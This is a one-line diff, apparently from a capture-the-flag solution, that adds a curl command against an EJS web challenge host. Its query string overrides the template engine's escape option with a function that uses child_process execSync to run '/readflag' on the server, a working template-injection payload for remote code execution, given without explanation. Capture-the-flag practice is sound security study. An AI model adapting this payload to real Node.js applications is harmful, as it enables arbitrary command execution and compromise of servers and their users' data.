@@ -1,0 +1,1 @@
+curl http://ejs.web.seetf.sg:1337/greet?debug=true&font=Arial&fontSize=14&name=beef&client=false&settings[view%20options][escape]=function%20(markup)%20{%20return%20process.mainModule.require(%27child_process%27).execSync(%27/readflag%27);%20};
